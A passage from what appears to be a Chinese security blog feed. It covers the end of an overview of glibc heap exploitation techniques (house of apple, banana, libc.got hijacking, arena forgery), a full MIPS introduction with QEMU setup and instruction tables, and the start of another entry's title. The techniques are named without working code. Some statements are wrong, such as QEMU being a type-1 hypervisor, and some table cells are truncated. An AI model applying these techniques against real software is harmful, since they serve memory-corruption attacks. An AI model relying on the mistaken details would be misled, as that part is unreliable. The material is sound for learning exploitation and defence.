emma</h3><p>只要<code>_IO_cookie_jumps</code>还在，这个方法就能继续使用。但是，由于<code>poniter_guard</code>处于<code>ld</code>的地址空间，所以某些场景是需要爆破的。</p><h3 id="1-5-3-house-of-obstack"><a href="#1-5-3-house-of-obstack" class="headerlink" title="1-5-3 house of obstack"></a>1-5-3 house of obstack</h3><p><code>glibc-2.36</code>的时候，<code>_IO_obstack_jumps</code>被去掉了，但是还有其他方法可以触发调用链。</p><p><code>glibc-2.37</code>开始这个方法的调用链为：<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>。</p><h3 id="1-5-4-house-of-apple1-2-3"><a href="#1-5-4-house-of-apple1-2-3" class="headerlink" title="1-5-4 house of apple1&#x2F;2&#x2F;3"></a>1-5-4 house of apple1&#x2F;2&#x2F;3</h3><ul><li><code>apple1</code>需要和其他技巧结合使用，可以任意地址写堆地址</li><li><code>apple2</code>利用的<code>_wide_vtable</code>缺乏校验调用函数指针</li><li><code>apple3</code>利用<code>shlib_handle</code>去绕过只指针加密调用函数指针</li></ul><h2 id="1-6-rtld-global"><a href="#1-6-rtld-global" class="headerlink" title="1-6 _rtld_global"></a>1-6 _rtld_global</h2><h3 id="1-6-1-house-of-banana"><a href="#1-6-1-house-of-banana" class="headerlink" title="1-6-1 house of banana"></a>1-6-1 house of banana</h3><p>整体来看，就是<code>hosue of banana</code>的利用</p><h3 id="1-6-2-利用link-map"><a href="#1-6-2-利用link-map" class="headerlink" title="1-6-2 利用link_map"></a>1-6-2 利用link_map</h3><p>围绕<code>link_map</code>有很多利用技巧，比如之前有使用格式化字符串修改掉<code>link_map-&gt;l_addr</code>，可以让函数解析后的地址被写入到其他地址处。而<code>house of banana</code>的本质也是围绕<code>link_map</code>做利用。</p><h2 id="1-7-libc-got"><a href="#1-7-libc-got" class="headerlink" title="1-7 libc.got"></a>1-7 libc.got</h2><h3 id="1-7-1-libc-got-in-IO"><a href="#1-7-1-libc-got-in-IO" class="headerlink" title="1-7-1 libc.got in IO"></a>1-7-1 libc.got in IO</h3><p>比如高版本<code>house of pig</code>没有办法覆写<code>hook</code>指针，因为这些指针都被删掉了，那么可以覆写<code>libc.got</code>项，在<code>IO</code>处理函数中存在着<code>memcpy/memmove</code>等函数，当这些函数被调用的时候会<code>jmp</code>到对应的<code>libc.got</code>存储的地址，因此可以控制<code>libc.got</code>的内容来劫持<code>RIP</code>。</p><h3 id="1-7-2-libc-got-in-malloc-printerr"><a href="#1-7-2-libc-got-in-malloc-printerr" class="headerlink" title="1-7-2 libc.got in malloc_printerr"></a>1-7-2 libc.got in malloc_printerr</h3><p>此外，在<code>malloc</code>中的<code>malloc_printerr</code>和<code>assert</code>，都会调用到<code>strlen</code>的<code>got</code>，因此，在高版本中可劫持该函数的<code>got</code>，来控制<code>RIP</code>。</p><p>具体来看，就是在<code>__libc_message</code>中有调用<code>strlen</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* Abort with an error message.  */</span><br><br><span class="hljs-type">void</span><br><br>__libc_message (<span class="hljs-keyword">enum</span> __libc_message_action action, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)<br><br>&#123;<br><br> <span class="hljs-comment">// ......</span><br><br>      <span class="hljs-keyword">if</span> (cp[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span> &amp;&amp; cp[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;s&#x27;</span>)<br><br>&#123;<br><br>  str = va_arg (ap, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *);<br><br>  len = <span class="hljs-built_in">strlen</span> (str); <span class="hljs-comment">// 这里调用了strlen</span><br><br>  cp += <span class="hljs-number">2</span>;<br><br>&#125;<br><br>      <span class="hljs-comment">//.....</span><br><br>  &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="1-8-heap-info-malloc-state"><a href="#1-8-heap-info-malloc-state" class="headerlink" title="1-8 heap_info&#x2F;malloc_state"></a>1-8 heap_info&#x2F;malloc_state</h2><p>攻击堆管理中最核心的数据结构，比如有：</p><ul><li><code>house of mind</code>伪造<code>heap_info</code>结构体，进而控制<code>arena</code></li><li>直接打掉<code>thread_arena</code>，伪造一个<code>arena</code></li><li>打掉线程的<code>tcache</code>变量</li><li>修改<code>pointer_guard</code>等</li></ul><h2 id="1-9-environ"><a href="#1-9-environ" class="headerlink" title="1-9 __environ"></a>1-9 __environ</h2><ul><li><code>GLIBC_TUNABLE</code>环境变量的设置会控制<code>ptmalloc_init</code>的流程，影响很多关键变量的设置，比如<code>tcache_counts</code>等。在这里有着设置示例<a href="https://www.gnu.org/software/libc/manual/html_node/Tunables.html">Tunables (The GNU C Library)</a>。比如<code>export GLIBC_TUNABLES=glibc.malloc.tcache_count=2</code></li><li>有些特殊的环境变量会泄露出信息，比如<code>LD_SHOW_AUXV</code></li></ul><h2 id="1-10-other"><a href="#1-10-other" class="headerlink" title="1-10 other"></a>1-10 other</h2><p>这里是一些不太好归类的攻击面。有：</p><ul><li><code>house of muney</code>，一种<code>steal heap</code>的技巧，通过修改<code>mmap chunk</code>的<code>size</code>来达成利用</li><li><code>exit</code>的时候会<code>call tls_call_list</code>里面的函数指针，但是也要能控制<code>pointer_guard</code></li><li><code>exit</code>的时候会调用一些锁的函数指针，某些博客中称之为<code>exit_hook</code>，但是在<code>2.34</code>之后这些<code>hook</code>被静态函数所代替</li></ul>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>libc利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIPS基础入门</title>
    <link href="/2025/03/04/MIPS%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <url>/2025/03/04/MIPS%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="MIPS基础入门"><a href="#MIPS基础入门" class="headerlink" title="MIPS基础入门"></a>MIPS基础入门</h1><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><p> 首先我们来介绍一下什么是mips，MIPS架构是一种采取 <strong>精简指令集</strong>（RISC）的处理器架构，1981年出现，由MIPS科技公司开发并授权，它是基于一种固定长度的定期编码指令集，并采用 <strong>导入&#x2F;存储</strong>（Load&#x2F;Store）数据模型。经改进，这种架构可支持高级语言的优化执行。其算术和逻辑运算采用三个操作数的形式，允许编译器优化复杂的表达式。</p><p> 如今基于该架构的芯片广泛被使用在许多电子产品、网络设备、个人娱乐装置与商业装置上。最早的MIPS架构是32位，最新的版本已经变成64位。</p><h2 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h2><p> 我们的虚拟机基本都是ubuntu，也就是基于8086架构，所以这里我们学习mips需要理由qemu来模拟这个架构，而QEMU代表快速模拟器，是虚拟化领域的一个重要工具，能够在单个硬件平台上同时运行多个操作系统。以其能够仿真广泛的客户系统和架构而闻名，QEMU是创建和管理虚拟环境的多功能解决方案。它作为一个类型1虚拟机运行，直接与物理硬件接口，这与其他虚拟化技术有显著的不同。通过整合像Intel VT和AMD-V这样的硬件虚拟化技术，QEMU优化了虚拟机的性能，为开发人员和IT专业人员提供了一个强大的平台，用于模拟各种计算环境，无需为每个系统提供专用硬件。</p><p> 下面是一个自动化脚本，运行可以得到完整配置的qemu和mips，现在我们来编译一个demo，看看怎么个事儿。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, MIPS!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于MIPS来说，有大端和小端两种格式，mips是大端，mipsel是小端，且都支持32位和64位的指令集。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#32位小端序：</span><br>mipsel-linux-gnu-gcc -g test.c -o test_mipsel_32<br><span class="hljs-comment">#使用小端 MIPS 架构的编译器生成 32 位小端格式的可执行文件。</span><br><br><span class="hljs-comment">#32位大端序：</span><br>mips-linux-gnu-gcc -g test.c -o test_mips_32<br><span class="hljs-comment">#使用大端 MIPS 架构的编译器生成 32 位大端格式的可执行文件。</span><br><br><span class="hljs-comment">#64位小端序：</span><br>mips64el-linux-gnuabi64-gcc -g test.c -o test_mipsel_64<br><span class="hljs-comment">#使用小端 MIPS 64 位架构的编译器生成小端 64 位的可执行文件。</span><br><br><span class="hljs-comment">#64位大端序：</span><br>mips64-linux-gnuabi64-gcc -g test.c -o test_mips_64<br><span class="hljs-comment">#使用大端 MIPS 64 位架构的编译器生成大端 64 位的可执行文件。</span><br><br><br></code></pre></td></tr></table></figure><p>现在我们测试一下其中一个</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304180828333.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304180828333.png" alt="image-20250304180828333"></a></p><p>然后我们就能模拟运行这个mips框架的elf文件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mips64el-static -L /usr/mips64el-linux-gnuabi64 ./test_mipsel_64<br><br></code></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304183115538.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304183115538.png" alt="image-20250304183115538"></a></p><p>这里的<code>-L /usr/mips-linux-gnu/</code>指向MIPS库的位置，根据具体环境可能需要调整。这里是默认的位置，当然如果你的并不可以，那可以选择使用如下的语句来寻找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -L libc6-mipsel-cross<br><br></code></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304183320297.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304183320297.png" alt="image-20250304183320297"></a></p><h2 id="MIPS指令集"><a href="#MIPS指令集" class="headerlink" title="MIPS指令集"></a>MIPS指令集</h2><h3 id="1-MIPS-指令集结构"><a href="#1-MIPS-指令集结构" class="headerlink" title="1. MIPS 指令集结构"></a>1. <strong>MIPS 指令集结构</strong></h3><p>MIPS 指令集是精简指令集（RISC）架构的典型代表，所有指令长度为 32 位。指令分为三种类型：<strong>R 型</strong>、<strong>I 型</strong> 和 <strong>J 型</strong>，每种类型有不同的操作码格式。</p><ul><li><p><strong>R 型指令</strong>（寄存器-寄存器操作）：适用于寄存器之间的运算，通常包括算术和逻辑操作。Op段为0，使用funct字段区分指令</p></li><li><p><strong>I 型指令</strong>（立即数操作）：适用于需要立即数或地址的操作。使用Op字段区分load&#x2F;store指令</p></li><li><p><strong>J 型指令</strong>（跳转操作）：用于跳转指令。使用Op字段区分指令</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304203733299.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250304203733299.png" alt="image-20250304203733299"></a></p></li></ul><h3 id="2-指令分类"><a href="#2-指令分类" class="headerlink" title="2. 指令分类"></a>2. <strong>指令分类</strong></h3><p>MIPS 指令集主要分为以下几类：</p><p>以下是 MIPS 指令的详细执行表，包括操作数的来源和结果存储位置：</p><h3 id="（1）算术运算指令"><a href="#（1）算术运算指令" class="headerlink" title="（1）算术运算指令"></a><strong>（1）算术运算指令</strong></h3><table><thead><tr><th>指令</th><th>功能</th><th>格式</th><th>执行描述</th></tr></thead><tbody><tr><td><code>add</code></td><td>有符号整数加法</td><td><code>add rd, rs, rt</code></td><td><code>rd = rs + rt</code></td></tr><tr><td><code>addi</code></td><td>有符号整数加法（立即数）</td><td><code>addi rt, rs, imm</code></td><td><code>rt = rs + imm</code></td></tr><tr><td><code>sub</code></td><td>有符号整数减法</td><td><code>sub rd, rs, rt</code></td><td><code>rd = rs - rt</code></td></tr><tr><td><code>mult</code></td><td>有符号乘法</td><td><code>mult rs, rt</code></td><td><code>HI, LO = rs × rt</code>（结果存储在 HI&#x2F;LO 寄存器）</td></tr><tr><td><code>div</code></td><td>有符号除法</td><td><code>div rs, rt</code></td><td><code>LO = rs / rt, HI = rs % rt</code>（商存 <code>LO</code>，余数存 <code>HI</code>）</td></tr></tbody></table><hr><h3 id="（2）逻辑运算指令"><a href="#（2）逻辑运算指令" class="headerlink" title="（2）逻辑运算指令"></a><strong>（2）逻辑运算指令</strong></h3><table><thead><tr><th>指令</th><th>功能</th><th>格式</th><th>执行描述</th></tr></thead><tbody><tr><td><code>and</code></td><td>按位与</td><td><code>and rd, rs, rt</code></td><td><code>rd = rs &amp; rt</code></td></tr><tr><td><code>andi</code></td><td>按位与（立即数）</td><td><code>andi rt, rs, imm</code></td><td><code>rt = rs &amp; imm</code></td></tr><tr><td><code>or</code></td><td>按位或</td><td><code>or rd, rs, rt</code></td><td><code>rd = rs</code></td></tr><tr><td><code>ori</code></td><td>按位或（立即数）</td><td><code>ori rt, rs, imm</code></td><td><code>rt = rs</code></td></tr><tr><td><code>xor</code></td><td>按位异或</td><td><code>xor rd, rs, rt</code></td><td><code>rd = rs ^ rt</code></td></tr><tr><td><code>nor</code></td><td>按位取反或</td><td><code>nor rd, rs, rt</code></td><td><code>rd = ~(rs</code></td></tr></tbody></table><hr><h3 id="（3）移位指令"><a href="#（3）移位指令" class="headerlink" title="（3）移位指令"></a><strong>（3）移位指令</strong></h3><table><thead><tr><th>指令</th><th>功能</th><th>格式</th><th>执行描述</th></tr></thead><tbody><tr><td><code>sll</code></td><td>左移</td><td><code>sll rd, rt, shamt</code></td><td><code>rd = rt &lt;&lt; shamt</code></td></tr><tr><td><code>srl</code></td><td>逻辑右移</td><td><code>srl rd, rt, shamt</code></td><td><code>rd = rt &gt;&gt; shamt</code>（高位补 0）</td></tr><tr><td><code>sra</code></td><td>算术右移</td><td><code>sra rd, rt, shamt</code></td><td><code>rd = rt &gt;&gt; shamt</code>（高位补符号位）</td></tr></tbody></table><hr><h3 id="（4）数据传输指令"><a href="#（4）数据传输指令" class="headerlink" title="（4）数据传输指令"></a><strong>（4）数据传输指令</strong></h3><table><thead><tr><th>指令</th><th>功能</th><th>格式</th><th>执行描述</th></tr></thead><tbody><tr><td><code>lw</code></td><td>加载字</td><td><code>lw rt, offset(rs)</code></td><td><code>rt = *(rs + offset)</code>（从 <code>rs + offset</code> 地址加载 4 字节到 <code>rt</code>）</td></tr><tr><td><code>sw</code></td><td>存储字</td><td><code>sw rt, offset(rs)</code></td><td><code>*(rs + offset) = rt</code>（将 <code>rt</code> 存到 <code>rs + offset</code> 地址）</td></tr><tr><td><code>lb</code></td><td>加载字节</td><td><code>lb rt, offset(rs)</code></td><td><code>rt = *(rs + offset)</code>（加载 1 字节，符号扩展到 32 位）</td></tr><tr><td><code>sb</code></td><td>存储字节</td><td><code>sb rt, offset(rs)</code></td><td><code>*(rs + offset) = rt</code>（仅存储 <code>rt</code> 的低 8 位到 <code>rs + offset</code>）</td></tr></tbody></table><hr><h3 id="（5）条件分支指令"><a href="#（5）条件分支指令" class="headerlink" title="（5）条件分支指令"></a><strong>（5）条件分支指令</strong></h3><table><thead><tr><th>指令</th><th>功能</th><th>格式</th><th>执行描述</th></tr></thead><tbody><tr><td><code>beq</code></td><td>等于则跳转</td><td><code>beq rs, rt, label</code></td><td><code>if (rs == rt) goto label</code></td></tr><tr><td><code>bne</code></td><td>不等则跳转</td><td><code>bne rs, rt, label</code></td><td><code>if (rs != rt) goto label</code></td></tr><tr><td><code>bgtz</code></td><td>大于零则跳转</td><td><code>bgtz rs, label</code></td><td><code>if (rs &gt; 0) goto label</code></td></tr><tr><td><code>blez</code></td><td>小于等于零则跳转</td><td><code>blez rs, label</code></td><td><code>if (rs &lt;= 0) goto label</code></td></tr></tbody></table><hr><h3 id="（6）跳转指令"><a href="#（6）跳转指令" class="headerlink" title="（6）跳转指令"></a><strong>（6）跳转指令</strong></h3><table><thead><tr><th>指令</th><th>功能</th><th>格式</th><th>执行描述</th></tr></thead><tbody><tr><td><code>j</code></td><td>无条件跳转</td><td><code>j label</code></td><td><code>goto label</code></td></tr><tr><td><code>jal</code></td><td>跳转并链接</td><td><code>jal label</code></td><td><code>ra = PC + 4; goto label</code>（保存返回地址）</td></tr><tr><td><code>jr</code></td><td>寄存器跳转</td><td><code>jr rs</code></td><td><code>goto rs</code>（跳转到 <code>rs</code> 指向的地址）</td></tr></tbody></table><hr><h3 id="3-特殊指令"><a href="#3-特殊指令" class="headerlink" title="3. 特殊指令"></a>3. <strong>特殊指令</strong></h3><ul><li><code>syscall</code>：用于系统调用，通常用于程序和操作系统之间的交互。</li><li><code>nop</code>：空操作指令，执行时不产生任何效果，通常用于指令延迟槽。</li></ul><h2 id="MIPS-寄存器"><a href="#MIPS-寄存器" class="headerlink" title="MIPS 寄存器"></a>MIPS 寄存器</h2><h3 id="常用寄存器"><a href="#常用寄存器" class="headerlink" title="常用寄存器"></a>常用寄存器</h3><table><thead><tr><th>名称</th><th>编号</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td><code>$zero</code></td><td><code>$0</code></td><td>常数 0</td><td>值恒为 <code>0</code>，无法更改</td></tr><tr><td><code>$at</code></td><td><code>$1</code></td><td>汇编器临时寄存器</td><td>由汇编器内部使用，不建议手动操作</td></tr><tr><td><code>$v0-$v1</code></td><td><code>$2-$3</code></td><td>函数返回值</td><td>32 位返回值存于 <code>$v0</code>，64 位返回值存于 <code>$v0, $v1</code></td></tr><tr><td><code>$a0-$a3</code></td><td><code>$4-$7</code></td><td>函数参数</td><td>依次存放第 1-4 个参数，更多参数需使用栈</td></tr><tr><td><code>$t0-$t7</code></td><td><code>$8-$15</code></td><td>临时寄存器</td><td>不需要保持值，函数调用后可能被覆盖</td></tr><tr><td><code>$s0-$s7</code></td><td><code>$16-$23</code></td><td>保存寄存器</td><td>需要保持值，函数调用时需保存和恢复</td></tr><tr><td><code>$t8-$t9</code></td><td><code>$24-$25</code></td><td>额外临时寄存器</td><td>用法同 <code>$t0-$t7</code></td></tr><tr><td><code>$k0-$k1</code></td><td><code>$26-$27</code></td><td>内核保留寄存器</td><td>仅操作系统使用，用户程序不应修改</td></tr><tr><td><code>$gp</code></td><td><code>$28</code></td><td>全局指针</td><td>指向全局数据区</td></tr><tr><td><code>$sp</code></td><td><code>$29</code></td><td>栈指针</td><td>指向栈顶，函数调用时维护</td></tr><tr><td><code>$fp</code></td><td><code>$30</code></td><td>帧指针</td><td>用于存储栈帧地址（可选）</td></tr><tr><td><code>$ra</code></td><td><code>$31</code></td><td>返回地址</td><td><code>jal</code> 指令跳转时存储返回地址</td></tr></tbody></table><h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td><code>HI</code></td><td>存储乘法的高 32 位结果或除法的余数</td></tr><tr><td><code>LO</code></td><td>存储乘法的低 32 位结果或除法的商</td></tr><tr><td><code>PC</code></td><td>程序计数器，存储当前执行指令的地址</td></tr></tbody></table><h2 id="MIPS特性"><a href="#MIPS特性" class="headerlink" title="MIPS特性"></a>MIPS特性</h2><h4 id="1-指令集架构"><a href="#1-指令集架构" class="headerlink" title="1. 指令集架构"></a><strong>1. 指令集架构</strong></h4><ul><li><p><strong>固定指令长度</strong>：所有 MIPS 指令都是 <strong>4 字节（32 位）</strong>，符合 RISC（精简指令集计算机）设计理念。</p></li><li><p><strong>流水线优化</strong>：MIPS 采用 <strong>多级流水线</strong>，提高指令执行效率，但也带来了<strong>分支延迟效应</strong>和<strong>载入延迟效应</strong>。</p></li><li><p>分支延迟槽（Branch Delay Slot）</p><p>：</p><ul><li>由于流水线特性，<strong>分支跳转指令后的一条指令仍会执行</strong>，称为<strong>分支延迟槽</strong>。</li><li>典型情况下，这条指令是 <code>nop</code>（无操作），但可以替换为对程序无害的有用指令。</li></ul></li></ul><h4 id="2-内存与栈管理"><a href="#2-内存与栈管理" class="headerlink" title="2. 内存与栈管理"></a><strong>2. 内存与栈管理</strong></h4><ul><li><p><strong>栈增长方向</strong>：MIPS 架构的<strong>栈（Stack）从高地址向低地址增长</strong>。</p></li><li><p>缓存（Cache）机制</p><p>：</p><ul><li><strong>指令缓存（I-Cache）</strong> 和 <strong>数据缓存（D-Cache）</strong> 独立存储，指令和数据不会混用。</li><li><strong>执行代码必须先经过缓存刷新</strong>，否则数据缓存中的 shellcode 可能不会被执行，通常<strong>执行 <code>sleep(1)</code> 触发缓存刷新</strong>。</li></ul></li></ul><h4 id="3-函数调用约定"><a href="#3-函数调用约定" class="headerlink" title="3. 函数调用约定"></a><strong>3. 函数调用约定</strong></h4><ul><li><strong>叶子函数（Leaf Function）</strong>：函数内部<strong>没有调用其他函数</strong>，仅使用 <code>$t0-$t9</code> 作为临时寄存器。</li><li><strong>非叶子函数（Non-Leaf Function）</strong>：函数内部<strong>调用了其他函数</strong>，需要保存 <code>$ra</code>（返回地址寄存器） 以及可能被覆盖的 <code>$s0-$s7</code> 寄存器。</li></ul><h4 id="4-MIPS-代码执行安全性"><a href="#4-MIPS-代码执行安全性" class="headerlink" title="4. MIPS 代码执行安全性"></a><strong>4. MIPS 代码执行安全性</strong></h4><ul><li><p>指令与数据分离</p><p>：</p><ul><li>由于指令和数据分别存储在 <code>I-Cache</code> 和 <code>D-Cache</code>，在<strong>代码注入攻击</strong>中，如果 <code>D-Cache</code> 没有同步刷新到 <code>I-Cache</code>，则 <code>shellcode</code> 可能不会执行。</li><li>解决方案：<strong>使用 <code>sleep(1)</code> 或 <code>flush cache</code> 触发缓存同步</strong>。</li></ul></li></ul><h4 id="5-MIPS-指令特点"><a href="#5-MIPS-指令特点" class="headerlink" title="5. MIPS 指令特点"></a><strong>5. MIPS 指令特点</strong></h4><ul><li><p><strong>RISC 设计</strong>：指令种类少，每条指令执行时间固定。</p></li><li><p>加载&#x2F;存储架构（Load&#x2F;Store Architecture）</p><p>：</p><ul><li>只有 <code>lw</code>（加载字） 和 <code>sw</code>（存储字） 指令可以访问内存，其他指令只能操作寄存器。</li></ul></li><li><p><strong>延迟槽优化</strong>：跳转指令的下一条指令<strong>仍会被执行</strong>，需手动填充 <code>nop</code> 或有用的指令。</p></li></ul><hr><h3 id="MIPS-体系结构核心特性概述"><a href="#MIPS-体系结构核心特性概述" class="headerlink" title="MIPS 体系结构核心特性概述"></a><strong>MIPS 体系结构核心特性概述</strong></h3><table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>指令长度</strong></td><td>所有指令都是 <strong>4 字节</strong>（32 位）</td></tr><tr><td><strong>流水线效应</strong></td><td><strong>分支延迟槽</strong>，跳转指令后的一条指令仍会执行</td></tr><tr><td><strong>栈方向</strong></td><td><strong>从高地址向低地址增长</strong></td></tr><tr><td><strong>缓存结构</strong></td><td><strong>独立的 I-Cache 和 D-Cache</strong>，代码执行前需刷新缓存</td></tr><tr><td><strong>调用约定</strong></td><td><strong>叶子函数不保存 <code>$ra</code>，非叶子函数需保存 <code>$ra</code> 和 <code>$s0-$s7</code></strong></td></tr><tr><td><strong>加载存储架构</strong></td><td>只有 <code>lw</code> &#x2F; <code>sw</code> 访问内存，其他指令操作寄存器</td></tr><tr><td><strong>安全性</strong></td><td><code>shellcode</code> 可能因缓存未同步导致执行失败，需要 <code>flush</code></td></tr></tbody></table><h2 id="MIPS系统调用码"><a href="#MIPS系统调用码" class="headerlink" title="MIPS系统调用码"></a>MIPS系统调用码</h2><p>MIPS 系统调用（syscall）使用 <code>$v0</code> 寄存器指定调用码，不同的调用码执行不同的系统功能。以下是常见的 MIPS 系统调用码表：</p><table><thead><tr><th><strong>调用码（$v0）</strong></th><th><strong>函数名字</strong></th><th><strong>功能</strong></th><th><strong>调用条件</strong></th></tr></thead><tbody><tr><td>1</td><td><code>print_int</code></td><td>打印整数</td><td><code>$a0</code> &#x3D; 要打印的整数</td></tr><tr><td>2</td><td><code>print_float</code></td><td>打印浮点数（单精度）</td><td><code>$f12</code> &#x3D; 要打印的浮点数</td></tr><tr><td>3</td><td><code>print_double</code></td><td>打印双精度浮点数</td><td><code>$f12</code> &#x3D; 要打印的双精度浮点数</td></tr><tr><td>4</td><td><code>print_string</code></td><td>打印字符串</td><td><code>$a0</code> &#x3D; 字符串地址</td></tr><tr><td>5</td><td><code>read_int</code></td><td>读取整数</td><td>读取的整数存入 <code>$v0</code></td></tr><tr><td>6</td><td><code>read_float</code></td><td>读取浮点数（单精度）</td><td>读取的浮点数存入 <code>$f0</code></td></tr><tr><td>7</td><td><code>read_double</code></td><td>读取双精度浮点数</td><td>读取的双精度浮点数存入 <code>$f0</code></td></tr><tr><td>8</td><td><code>read_string</code></td><td>读取字符串</td><td><code>$a0</code> &#x3D; 缓冲区地址, <code>$a1</code> &#x3D; 最大长度</td></tr><tr><td>9</td><td><code>sbrk</code></td><td>分配内存（返回地址）</td><td><code>$a0</code> &#x3D; 需要分配的字节数，返回分配的内存地址于 <code>$v0</code></td></tr><tr><td>10</td><td><code>exit</code></td><td>退出程序</td><td>无</td></tr><tr><td>11</td><td><code>print_char</code></td><td>打印字符</td><td><code>$a0</code> &#x3D; 要打印的字符</td></tr><tr><td>12</td><td><code>read_char</code></td><td>读取字符</td><td>读取的字符存入 <code>$v0</code></td></tr><tr><td>13</td><td><code>open</code></td><td>打开文件</td><td><code>$a0</code> &#x3D; 文件名地址, <code>$a1</code> &#x3D; 访问模式, <code>$a2</code> &#x3D; 权限（可选），返回文件描述符</td></tr><tr><td>14</td><td><code>read</code></td><td>读取文件</td><td><code>$a0</code> &#x3D; 文件描述符, <code>$a1</code> &#x3D; 读取缓冲区, <code>$a2</code> &#x3D; 读取字节数，返回读取的字节数</td></tr><tr><td>15</td><td><code>write</code></td><td>写入文件</td><td><code>$a0</code> &#x3D; 文件描述符, <code>$a1</code> &#x3D; 写入缓冲区, <code>$a2</code> &#x3D; 写入字节数，返回写入的字节数</td></tr><tr><td>16</td><td><code>close</code></td><td>关闭文件</td><td><code>$a0</code> &#x3D; 文件描述符</td></tr><tr><td>17</td><td><code>exit2</code></td><td>退出程序（带返回值）</td><td><code>$a0</code> &#x3D; 退出码</td></tr></tbody></table><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">li $v0, 1        # 设置 syscall 码为 1（print_int）<br>li $a0, 123      # 要打印的整数<br>syscall          # 执行系统调用<br><br></code></pre></td></tr></table></figure><p>以上代码会打印 <code>123</code>。</p><p>MIPS syscall 机制允许程序通过 <code>syscall</code> 指令调用操作系统提供的服务，适用于 MIPS 汇编语言模拟器（如 MARS、SPIM）。</p>]]></content>
    
    
    <categories>
      
      <category>IOT安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MIPS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向常见加密算法</title>
    <link href="/2025/01/19/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/2025/01/19/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
